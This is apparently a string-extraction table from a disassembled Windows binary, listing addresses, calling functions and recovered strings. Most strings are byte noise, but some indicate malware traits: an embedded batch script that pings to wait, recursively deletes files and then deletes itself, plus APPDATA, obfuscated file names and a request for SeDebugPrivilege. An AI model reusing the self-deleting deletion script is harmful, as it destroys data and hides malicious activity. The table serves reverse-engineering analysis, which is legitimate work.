reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4330cc	0x4310bf	string	0x4330a1	WS1ۃ blocks=Basic Latin,Arabic
0x4330dc	0x4310bf	string	0x4330a1	WS1ۃ blocks=Basic Latin,Arabic
0x43310c	0x435d81	string	0x4330a1	UWVS
0x433141	0x42a321	string	0x4330a1	UWVS
0x4331d6	0x42a321	string	0x433160	UWVS
0x43342c	0x42a321	string	0x433160	UWVS
0x433791	0x4336ca	string	0x43376f	UWVS
0x4337e5	0x4337ae	string	0x43376f	;t$ }3A
0x433c6d	0x433b47	string	0x433b47	UWVS
0x434104	0x436222	string	0x433db6	UWVS
0x43421f	0x433cb4	string	0x4341a7	UWVS
0x434290	0x42a321	string	0x4341a7	UWVS
0x434401	0x433b47	string	0x4342a8	UWVS
0x4344f3	0x42a321	string	0x4342a8	UWVS
0x43468d	0x42a321	string	0x4342a8	UWVS
0x434883	0x42a321	string	0x4342a8	UWVS
0x4348ce	0x42a321	string	0x4342a8	UWVS
0x434981	0x42a321	string	0x4342a8	UWVS
0x4349ee	0x42a321	string	0x4342a8	UWVS
0x434fee	0x429f77	string	0x434d48	UWVS
0x43538d	0x428f73	string	0x435078	UWVS
0x4353ce	0x435078	string	0x4353ad	UWVS
0x4353f9	0x42a321	string	0x4353ad	UWVS
0x4357d8	0x43582d	string	0x4357a9	[^ËD$ blocks=Basic Latin,Latin-1 Supplement
0x435819	0x43582d	string	0x4357a9	[^ËD$ blocks=Basic Latin,Latin-1 Supplement
0x435822	0x43582d	string	0x4357a9	[^ËD$ blocks=Basic Latin,Latin-1 Supplement
0x4358df	0x43591b	string	0x4358ce	[^_]
0x435901	0x43591b	string	0x4358ce	[^_]
0x43592c	0x435964	string	0x435920	[^_]
0x435ad1	0x435ad5	string	0x435ab5	[ËT$ blocks=Basic Latin,Latin-1 Supplement
0x435b6c	0x435b71	string	0x435b23	Z[^_]
0x435c9e	0x435c84	string	0x435c82	9T$\ft
0x435cba	0x435cb0	string	0x435ca6	;D$\ft
0x436290	0x436256	string	0x436222	;|$4}6
0x4367f6	0x435b23	string	0x43646c	UWVSQ
0x436823	0x435b23	string	0x43646c	UWVSQ
0x43684d	0x435b23	string	0x43646c	UWVSQ
0x4369a1	0x433999	string	0x436959	UWVS
0x436b25	0x436379	string	0x436b02	UWVS
0x436bcb	0x42bda2	string	0x436b02	UWVS
0x436d6f	0x42a321	string	0x436b02	UWVS
0x436da0	0x42a321	string	0x436b02	UWVS
0x436ec1	0x435b23	string	0x436e3d	UWVSQ
0x436ed9	0x435b23	string	0x436e3d	UWVSQ
0x436f82	0x436e3d	string	0x436e3d	UWVS
0x4370a1	0x436e3d	string	0x436e3d	UWVS
0x437119	0x42a321	string	0x436e3d	UWVS
0x437171	0x42a321	string	0x436e3d	UWVS
0x43736a	0x42a321	string	0x436e3d	UWVS
0x4373d1	0x42a321	string	0x436e3d	UWVS
0x437405	0x42a321	string	0x436e3d	UWVS
0x4374f6	0x42a321	string	0x436e3d	UWVS
0x4375cb	0x42a321	string	0x436e3d	UWVS
0x437630	0x42a321	string	0x436e3d	UWVS
0x4376c2	0x42a321	string	0x43764f	UWVS
0x4377de	0x42a321	string	0x4376d0	UWVS
0x43783f	0x42a321	string	0x4376d0	UWVS
0x43793a	0x42a321	string	0x4378ed	UWVS
0x437a54	0x435cbd	string	0x4379c6	UWVS
0x437a78	0x435cbd	string	0x4379c6	UWVS
0x43887e	0x438880	string	0x437f78	@echo off\r\nping 192.0.2.2 -n 1 -w %d >nul 2>&1\r\nDEL /s "%s" >nul 2>&1\r\ncall :deleteSelf&exit /b\r\n:deleteSelf\r\nstart /b "" cmd /c del "%%~f0"&exit /b\r\n
0x438ec6	0x438ee8	string	0x437f78	200 OK
0x43938c	0x43938e	string	0x437f78	Path=
0x43943b	0x43943d	string	0x437f78	APPDATA
0x439707	0x439710	string	0x437f78	9T9N u6d0
0x439b50	0x439bb6	string	0x437f78	l62Y0Ghy.Sii
0x439c77	0x439ca7	string	0x437f78	Cs43l63g4R3YW0d384id3iG3h3y.Sii
0x439f28	0x439f58	string	0x437f78	Cs43l63g4R3YW0d3s0WYd66dR240WRldR53iG3G3y.Sii
0x43a0b4	0x43a11a	string	0x437f78	siS6O.Sii
0x43a1af	0x43a1b8	string	0x437f78	%s\a%d\a0x%.8X (%d)\a
0x43a226	0x43a228	string	0x437f78	%c%.8x%s%s
0x43a231	0x43a233	string	0x437f78	%c%.8x%s\%s
0x43a326	0x43a328	string	0x437f78	mDLFDLLq
0x43a32f	0x43a331	string	0x437f78	MjrzjrLq
0x43a473	0x43a475	string	0x437f78	%llu
0x43ac56	0x43ac58	string	0x437f78	CryptGetHashParam
0x43ac59	0x43acd4	string	0x437f78	RegEnumKeyExA
0x43ad55	0x43adc0	string	0x437f78	CreateDirectoryA
0x43add5	0x43ae3c	string	0x437f78	EnterCriticalSection
0x43bcdb	0x43bc61	string	0x43ba9e	Ve#ӄ blocks=Basic Latin,Cyrillic
0x43bd2a	0x43bd7f	string	0x43ba9e	uS6sKr
0x43bebf	0x43be6f	string	0x43ba9e	'U\tm{+
0x43bee0	0x43bf3d	string	0x43ba9e	., Ca
0x43bf87	0x43bfa1	string	0x43ba9e	RjQj
0x43d46f	0x43d4e8	string	0x43ba9e	y6Fr
0x43d6c0	0x43d6e8	string	0x43ba9e	\rQvr
0x4449a5	0x4449e4	string	0x44499e	ÐSVWU blocks=Latin-1 Supplement,Basic Latin
0x4449c9	0x4449e4	string	0x44499e	ÐSVWU blocks=Latin-1 Supplement,Basic Latin
0x4451aa	0x444a4a	string	0x444fbe	SVWU
0x445223	0x445249	string	0x444fbe	_^[Ð blocks=Basic Latin,Latin-1 Supplement
0x445361	0x445379	string	0x444fbe	]_^[ËG blocks=Basic Latin,Latin-1 Supplement
0x445495	0x445468	string	0x444fbe	]_^[Ð blocks=Basic Latin,Latin-1 Supplement
0x4454ea	0x4454fc	string	0x444fbe	[Ëȋу blocks=Basic Latin,Latin-1 Supplement,Latin Extended-B,Cyrillic
0x445741	0x44574a	string	0x4456d2	[]ÐU blocks=Basic Latin,Latin-1 Supplement
0x4457bf	0x4457c7	string	0x44574e	_^[]Ë blocks=Basic Latin,Latin-1 Supplement
0x4457c3	0x4457c7	string	0x44574e	_^[]Ë blocks=Basic Latin,Latin-1 Supplement
0x44610d	0x446032	string	0x4460c2	SVWU
0x446acd	0x446aec	string	0x446a9a	_^[Ë blocks=Basic Latin,Latin-1 Supplement
0x446bbb	0x446bc0	string	0x446bb6	1ҍL$ blocks=Basic Latin,Cyrillic
0x446c3b	0x446c56	string	0x446c0e	_^[Y]Ë blocks=Basic Latin,Latin-1 Supplement
0x446d47	0x446d59	string	0x446d3e	ZXË\vD$ blocks=Basic Latin,Latin-1 Supplement
0x446e2a	0x4039ac	string	0x446d3e	x%\t';v
0x446f6c	0x446f78	string	0x446f6a	ZTUWVSPRTj\aj
0x4470f0	0x403c72	string	0x447016	R11bP
0x4471ab	0x4471fb	string	0x44719e	_^[]Ë blocks=Basic Latin,Latin-1 Supplement
0x4471e5	0x4471fb	string	0x44719e	_^[]Ë blocks=Basic Latin,Latin-1 Supplement
0x447210	0x447263	string	0x447202	_^[Y]Ð blocks=Basic Latin,Latin-1 Supplement
0x44724d	0x447263	string	0x447202	_^[Y]Ð blocks=Basic Latin,Latin-1 Supplement
0x4474f7	0x447416	string	0x4474f2	SVWU
0x447765	0x447666	string	0x447702	SVWU
0x447791	0x447666	string	0x44776e	SVWU
0x4478e1	0x4478ef	string	0x44786e	Z_^[X
0x447b63	0x447aaa	string	0x447b5a	SVWU
0x447c65	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447c71	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447c82	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447c8b	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447c9a	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447cb8	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447cce	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447cdd	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447cee	0x447cfb	string	0x447c16	_^[XË9 blocks=Basic Latin,Latin-1 Supplement
0x447ddc	0x447e42	string	0x447d26	SVWU
0x447df5	0x447d26	string	0x447d26	SVWU
0x447e2f	0x447e3b	string	0x447d26	]_^[Ë blocks=Basic Latin,Latin-1 Supplement
0x447e9a	0x447f2f	string	0x447e42	]_^[
0x447eb1	0x447f2f	string	0x447e42	]_^[
0x447ec5	0x447f2f	string	0x447e42	]_^[
0x447edc	0x447e42	string	0x447e42	SVWU
0x447ee8	0x447f2f	string	0x447e42	]_^[
0x447ef0	0x447d26	string	0x447e42	SVWU
0x447f05	0x447f2f	string	0x447e42	]_^[
0x447f19	0x447f2f	string	0x447e42	]_^[
0x447f8c	0x447e42	string	0x447f86	SVWU
0x4486c5	0x4486f4	string	0x448696	]_^[ÐU blocks=Basic Latin,Latin-1 Supplement
0x4486cb	0x4486f4	string	0x448696	]_^[ÐU blocks=Basic Latin,Latin-1 Supplement
0x4486ec	0x4486f4	string	0x448696	]_^[ÐU blocks=Basic Latin,Latin-1 Supplement
0x448712	0x44874d	string	0x4486fa	_^[YY]Ë\v blocks=Basic Latin,Latin-1 Supplement
0x449acc	0x449a6a	string	0x449abe	SVWU
0x449c77	0x449ca8	string	0x449c6a	[^_Ë blocks=Basic Latin,Latin-1 Supplement
0x449c85	0x449ca8	string	0x449c6a	[^_Ë blocks=Basic Latin,Latin-1 Supplement
0x44a0f7	0x44a0fb	string	0x44a0c2	_^[]
0x44a5e2	0x44a5eb	string	0x44a537	;}\fr
0x44a66a	0x44a673	string	0x44a659	1ɋ}\b\t blocks=Basic Latin,Latin Extended-B
0x44a7a2	0x44a7a6	string	0x44a782	Z_^[Í@ blocks=Basic Latin,Latin-1 Supplement
0x44a7d2	0x44a7e1	string	0x44a7ae	_^[Y]
0x44a879	0x4128a4	string	0x44a7ea	environment
0x44b7e5	0x44b7f6	string	0x44b7d6	^[Ð3ɀ= blocks=Basic Latin,Latin-1 Supplement,Latin Extended-B
0x44b844	0x44b866	string	0x44b832	^[ÐSVW blocks=Basic Latin,Latin-1 Supplement
0x44b855	0x44b866	string	0x44b832	^[ÐSVW blocks=Basic Latin,Latin-1 Supplement
0x44b924	0x44b931	string	0x44b8de	_^[Y]Í@ blocks=Basic Latin,Latin-1 Supplement
0x44be35	0x41291c	string	0x44bdca	context
0x44beed	0x40891c	string	0x44bdca	\t2ׅN blocks=Basic Latin,Hebrew
0x44c019	0x40891c	string	0x44c006	\t2ׅN blocks=Basic Latin,Hebrew
0x44c378	0x412810	string	0x44c006	baseAddress
0x44c38c	0x41281c	string	0x44c006	address
0x44c3a0	0x412824	string	0x44c006	components
0x44c3e9	0x4128a4	string	0x44c006	environment
0x44cb2b	0x44cbe3	string	0x44cb06	_^[YY]
0x44cbcf	0x44cbe3	string	0x44cb06	_^[YY]
0x44d751	0x44d6ba	string	0x44d712	SVWQ
0x44d761	0x44d6e6	string	0x44d712	SVWQ
0x44d894	0x44d8d5	string	0x44d882	_^[ÐU blocks=Basic Latin,Latin-1 Supplement
0x44d8a1	0x44d8d5	string	0x44d882	_^[ÐU blocks=Basic Latin,Latin-1 Supplement
0x44d97b	0x44d984	string	0x44d94e	^[Í@ blocks=Basic Latin,Latin-1 Supplement
0x44dac7	0x44dad5	string	0x44daa2	_^[ÐU blocks=Basic Latin,Latin-1 Supplement
0x44db6e	0x44db7d	string	0x44db2e	_^[ÐSVW blocks=Basic Latin,Latin-1 Supplement
0x44dc39	0x44dc3d	string	0x44db2e	]_^[
0x44e012	0x44e0ca	string	0x44dfbe	Z]_^[Ë blocks=Basic Latin,Latin-1 Supplement
0x44e09f	0x44e0b2	string	0x44dfbe	h@IA
0x44e11f	0x44e227	string	0x44e0d2	]_^[Ë blocks=Basic Latin,Latin-1 Supplement
0x44e254	0x44dfbe	string	0x44e22e	SVWUQf
0x44e259	0x44e0d2	string	0x44e22e	SVWUf
0x44e269	0x44dfbe	string	0x44e22e	SVWUQf
0x44e397	0x44e437	string	0x44e35a	Z]_^[ÐSVWU blocks=Basic Latin,Latin-1 Supplement
0x44e3cd	0x44e437	string	0x44e35a	Z]_^[ÐSVWU blocks=Basic Latin,Latin-1 Supplement
0x44e41f	0x44e437	string	0x44e35a	Z]_^[ÐSVWU blocks=Basic Latin,Latin-1 Supplement
0x44e4bd	0x44e4ce	string	0x44e4b6	3#XKA
0x44e4dc	0x44e4ed	string	0x44e4b6	3#TKA
0x44e4fb	0x44e50c	string	0x44e4b6	3#<IA
0x44e51a	0x44e52b	string	0x44e4b6	3#8IA
0x44e539	0x44e54a	string	0x44e4b6	3#0IA
0x44e558	0x44e569	string	0x44e4b6	3#`KA
0x44ea12	0x40b5a9	string	0x44e9ce	#RYP
0x44ea31	0x44ea3d	string	0x44e9ce	_^[Y]Í@ blocks=Basic Latin,Latin-1 Supplement
0x44eb67	0x44eb6b	string	0x44eb1e	[^_Í@ blocks=Basic Latin,Latin-1 Supplement
0x44ec3a	0x44eb1e	string	0x44eb86	WVS\t
0x44f026	0x44cfde	string	0x44ef96	SVWU
0x44f08e	0x44ef96	string	0x44f05e	SVW3ۀ= blocks=Basic Latin,Arabic
0x44f18f	0x44ef96	string	0x44f05e	SVW3ۀ= blocks=Basic Latin,Arabic
0x44f2ac	0x44f21a	string	0x44f26e	SQhȽ@ blocks=Basic Latin,Latin Extended-B
0x44f309	0x44bf9a	string	0x44f26e	SVWU
0x44f638	0x447416	string	0x44f61e	SVWU
0x454a91	0x454acd	string	0x454985	9T$,v
0x454a97	0x454acd	string	0x454985	9T$,v
0x454f36	0x454f70	string	0x454c4c	uM9l$D}G
0x4563c8	0x4563d8	string	0x456379	f;DM
0x456baa	0x456bee	string	0x456b7e	_^[]
0x457685	0x457689	string	0x457632	^[_]
0x4576c4	0x4576d6	string	0x45768e	_^[]
0x457760	0x45776b	string	0x457751	9}\fv)
0x457807	0x45784e	string	0x4577bc	Y_^[
0x458ad8	0x458adc	string	0x458a67	_^[]
0x458bee	0x458bf9	string	0x458b78	_^[]
0x458c96	0x458ca1	string	0x458bfe	_^[]
0x458ff3	0x458ff7	string	0x458f97	_^[]
0x4597e0	0x459820	string	0x45974e	Y_^[
0x459884	0x4598ef	string	0x459853	9]\bu!Sh
0x459f4b	0x459fad	string	0x459efe	_^]Ë@ blocks=Basic Latin,Latin-1 Supplement
0x459f8d	0x459fad	string	0x459efe	_^]Ë@ blocks=Basic Latin,Latin-1 Supplement
0x45a88f	0x45a8d8	string	0x45a824	Y_^[
0x45b0e2	0x45b0e6	string	0x45b033	X_^[]
0x45ced4		string	0x45cdc5	W~9\a
0x45d026		string	0x45cdc5	W~9\a
0x45d2c7	0x45d2ef	string	0x45d245	Sh,[A
0x45d2da	0x45d2ef	string	0x45d245	Sh,[A
0x45fa0a	0x45fa4c	string	0x45f9db	_^[]
0x45fcdc	0x45fbd9	string	0x45fb8d	j(j<W跑 blocks=Basic Latin,CJK Unified Ideographs
0x461f2c	0x461fb8	string	0x461e25	Wh$wA
0x461f3b	0x461fb8	string	0x461e25	Wh$wA
0x46284a	0x40f81c	string	0x462804	ϖ-yz blocks=Greek and Coptic,Basic Latin
0x464a4c	0x464a55	string	0x464a42	SjcXj:f
0x464e15	0x464f37	string	0x464b1c	SSh\t֙ blocks=Basic Latin,Hebrew
0x4652ef	0x4652f3	string	0x46522b	^_[]
0x466515	0x40c71a	string	0x466092	s^17
0x466533	0x4090aa	string	0x466092	%j$h
0x466683	0x411f1c	string	0x466092	get_Culture
0x466a08	0x4670e8	string	0x4668f5	Wj\nY3?
0x467b61	0x467b63	string	0x467666	SeDebugPrivilege
